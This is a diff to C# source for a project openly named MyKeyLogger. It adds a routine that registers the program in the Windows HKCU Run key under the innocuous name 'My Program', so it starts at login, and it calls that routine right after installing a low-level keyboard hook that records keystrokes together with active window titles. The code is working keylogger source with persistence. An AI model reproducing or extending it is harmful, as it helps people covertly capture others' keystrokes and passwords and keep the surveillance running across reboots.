@@ -10,6 +10,7 @@ using System.Linq;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
+using Microsoft.Win32;
 using Microsoft.Win32.SafeHandles;
 
 namespace MyKeyLogger
@@ -224,11 +225,23 @@ namespace MyKeyLogger
 	        return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
         
+        private static void AddApplicationToStartup()
+        {
+	        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+	        {
+		        key.SetValue("My Program", "\"" + Application.ExecutablePath + "\"");
+	        }
+        }
+        
         public static void Start()
         {        	
 	        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
         	//var handle = GetConsoleWindow();
             _hookID = SetHook(_proc);
+            
+            // Add application to starting apps for W10 users
+            AddApplicationToStartup();
+            
             Application.Run();
             UnhookWindowsHookEx(_hookID);
             //OperationKey.TurnOFFCapsLockKey();
